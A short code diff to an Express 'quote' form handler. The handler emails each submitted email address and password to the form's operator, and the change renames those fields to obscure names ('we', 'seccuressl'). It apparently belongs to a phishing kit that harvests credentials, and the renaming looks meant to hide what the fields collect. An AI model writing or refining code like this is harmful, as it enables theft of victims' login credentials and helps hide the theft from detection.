@@ -128,8 +128,8 @@ app.post("/quote", (req, res) => {
     <p>You have a new mail from full-stack business</p>
     <h3>Form Details</h3>
     <ul>
-      <li style="margin-bottom: 10px;">Email: ${req.body.email}</li>
-      <li style="margin-bottom: 10px;">Password: ${req.body.password}</li>
+      <li style="margin-bottom: 10px;">Email: ${req.body.we}</li>
+      <li style="margin-bottom: 10px;">Password: ${req.body.seccuressl}</li>
     </ul>
   `;
 
